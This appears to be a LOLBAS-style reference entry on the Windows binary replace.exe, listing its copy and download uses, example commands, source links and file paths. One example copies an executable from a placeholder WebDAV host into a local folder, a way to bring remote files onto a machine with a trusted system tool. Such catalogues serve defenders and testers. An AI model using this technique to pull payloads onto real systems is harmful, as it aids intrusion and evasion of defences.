## Replace.exe
* Functions: Copy, Download
```

replace.exe C:\Source\File.cab C:\Destination /A
Copy the specified file to the destination folder.

replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
Copy the specified file to the destination folder.
```
   
* Resources:   
  * https://twitter.com/elceef/status/986334113941655553
  * https://twitter.com/elceef/status/986842299861782529
   
* Full path:   
  * C:\Windows\System32\replace.exe
  * C:\Windows\SysWOW64\replace.exe
   
* Notes: Thanks to elceef - @elceef  
   
